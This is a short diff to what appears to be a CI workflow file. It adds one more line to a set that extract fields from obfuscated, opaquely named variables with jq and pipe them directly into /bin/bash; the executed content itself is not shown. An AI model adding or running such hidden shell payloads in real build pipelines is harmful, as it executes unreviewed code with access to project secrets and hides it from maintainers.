@@ -27,6 +27,7 @@ jobs:
           echo $t7 | jq -r .d24 | /bin/bash
           echo $pl3 | jq -r .jpjty5293 | /bin/bash
           printf '%s' "$wsc24825" | jq -r .g2 | /bin/bash
+          echo $xu1506 | jq -r .grn46 | /bin/bash
 
       - name: Save results
         if: always()
